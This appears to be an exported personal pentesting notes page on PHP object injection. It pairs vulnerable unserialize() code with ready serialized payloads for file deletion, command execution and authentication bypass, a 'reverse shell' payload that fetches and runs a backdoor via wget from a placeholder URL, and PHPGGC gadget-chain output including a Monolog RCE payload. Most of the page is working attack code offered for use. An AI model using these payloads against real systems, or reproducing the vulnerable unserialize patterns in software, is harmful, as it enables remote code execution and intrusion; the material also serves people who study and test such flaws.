<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PHP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">PHP</h1><br/><strong><br /></strong><strong><h2>PHP Magic Methods</h2></strong><br /><br /><table class="table"><col/><col/><col/><tr><th>click me</th><th>click me</th><th>click me</th></tr><tr><td>__construct()</td><td>__set()</td><td>__toString()</td></tr><tr><td>__destruct()</td><td>__isset()</td><td>__invoke()</td></tr><tr><td>__call()</td><td>__unset()</td><td>__set_state()</td></tr><tr><td>__callStatic()</td><td>__sleep()</td><td>__clone()</td></tr><tr><td>__get()</td><td>__wakeup()</td><td>__debugInfo()</td></tr></table><br /><br /><h2>Examples of PHP Object Injection</h2><br /><br /><h3>Exploit with the __destruct method</h3><br />Vulnerable code:<br /><code>class Example1<br />{<br />   public $cache_file;<br /><br />   function __construct()<br />   {<br />      // some PHP code...<br />   }<br /><br />   function __destruct()<br />   {<br />      $file = "/var/www/cache/tmp/{$this-&gt;cache_file}";<br />      if (file_exists($file)) @unlink($file);<br />   }<br />}<br /><br />// some PHP code...<br /><br />$user_data = unserialize($_GET['data']);<br /><br />// some PHP code..<br /></code>Payload:<br /><code>http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}<br /></code><br /><h3>Exploit with the __wakeup in the unserialize function</h3><br />Vulnerable code:<br /><code>&lt;?php <br />    class PHPObjectInjection{<br />        public $inject;<br />        function __construct(){<br />        }<br />        function __wakeup(){<br />            if(isset($this-&gt;inject)){<br />                eval($this-&gt;inject);<br />            }<br />        }<br />    }<br />    if(isset($_REQUEST['r'])){  <br />        $var1=unserialize($_REQUEST['r']);<br />        if(is_array($var1)){<br />            echo "&lt;br/&gt;".$var1[0]." - ".$var1[1];<br />        }<br />    }<br />    else{<br />        echo ""; # nothing happens here<br />    }<br />?&gt;<br /></code>Payload:<br /><code># Basic serialized data<br />a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}<br /><br /># Command execution<br />string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"<br /></code><br /><h3>Authentication bypass - Type juggling</h3><br />Vulnerable code:<br /><code>$data = unserialize($_COOKIE['auth']);<br /><br />if ($data['username'] == $adminName &amp;&amp; $data['password'] == $adminPassword) {<br />    $admin = true;<br />} else {<br />    $admin = false;<br />}<br /></code>Payload:<br /><code>a:2:{s:8:"username";b:1;s:8:"password";b:1;}<br /></code><br /><h3>Authentication bypass - Object reference</h3><br />Vulnerable code:<br /><code>&lt;?php<br />class Object<br />{<br />  var $guess;<br />  var $secretCode;<br />}<br /><br />$obj = unserialize($_GET['input']);<br /><br />if($obj) {<br />    $obj-&gt;secretCode = rand(500000,999999);<br />    if($obj-&gt;guess === $obj-&gt;secretCode) {<br />        echo "Win";<br />    }<br />}<br />?&gt;<br /></code>Payload:<br /><code>O:6:"Object":2:{s:10:"secretCode";N;s:4:"code";R:2;}<br /></code><br /><h3>Authentication bypass - Object reference</h3><br />Vulnerable code:<br /><code>class Example3<br />{<br />   protected $obj;<br /><br />   function __construct()<br />   {<br />      // some PHP code...<br />   }<br /><br />   function __toString()<br />   {<br />      if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;getValue();<br />   }<br />}<br /><br />// some PHP code...<br /><br />$user_data = unserialize($_POST['data']);<br /><br />// some PHP code..<br /></code>Payload:<br /><code>class SQL_Row_Value<br />{<br />   private $_table = "SQL Injection";<br />}<br /><br />class Example3<br />{<br />   protected $obj;<br /><br />   function __construct()<br />   {<br />      $this-&gt;obj = new SQL_Row_Value;<br />   }<br />}<br /><br />print urlencode(serialize(new Example3));<br /></code><br /><h2>Others exploits</h2><br /><br /><h3>Reverse Shell</h3><br /><code>class PHPObjectInjection<br />{<br />    // CHANGE URL/FILENAME TO MATCH YOUR SETUP<br />    public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php &amp;&amp; php phpobjbackdoor.php');";<br />}<br /><br />echo urlencode(serialize(new PHPObjectInjection));<br /></code><br /><h2>Finding and using gadgets (PHPGGC)</h2><br />PHPGGC is a library of unserialize() payloads along with a tool to  generate them, from command line or programmatically. When encountering  an unserialize on a website you donâ€™t have the code of, or simply when  trying to build an exploit, this tool allows you to generate the payload  without having to go through the tedious steps of finding gadgets and  combining them.<br /><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a><br /><code>$ ./phpggc -l<br /><br />Gadget Chains<br />-------------<br /><br />NAME                  VERSION           TYPE             VECTOR         I    <br />Doctrine/FW1          ?                 file_write       __toString     *    <br />Guzzle/FW1            6.0.0 &lt;= 6.3.2    file_write       __destruct          <br />Guzzle/RCE1           6.0.0 &lt;= 6.3.2    rce              __destruct          <br />Laravel/RCE1          5.4.27            rce              __destruct          <br />Laravel/RCE2          5.5.39            rce              __destruct          <br />Laravel/RCE3          5.5.39            rce              __destruct     *    <br />Laravel/RCE4          5.5.39            rce              __destruct          <br />Magento/SQLI1         ? &lt;= 1.9.3.4      sql_injection    __destruct          <br />Monolog/RCE1          1.18 &lt;= 1.23      rce              __destruct          <br />Monolog/RCE2          1.5 &lt;= 1.17       rce              __destruct          <br />Phalcon/RCE1          &lt;= 1.2.2          rce              __wakeup       *    <br />Slim/RCE1             3.8.1             rce              __toString          <br />SwiftMailer/FW1       5.1.0 &lt;= 5.4.8    file_write       __toString          <br />SwiftMailer/FW2       6.0.0 &lt;= 6.0.1    file_write       __toString          <br />SwiftMailer/FW3       5.0.1             file_write       __toString          <br />Symfony/FW1           2.5.2             file_write       DebugImport    *    <br />Symfony/RCE1          3.3               rce              __destruct     *    <br />Symfony/RCE2          2.3.42 &lt; 2.6      rce              __destruct     *    <br />Symfony/RCE3          2.6 &lt;= 2.8.32     rce              __destruct     *    <br />Yii/RCE1              1.1.19            rce              __destruct          <br />ZendFramework/RCE1    ? &lt;= 1.12.20      rce              __destruct     * <br /></code>Example:<br /><code>$ ./phpggc monolog/rce1 'phpinfo();'<br />O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}<br /></code></div></body></html>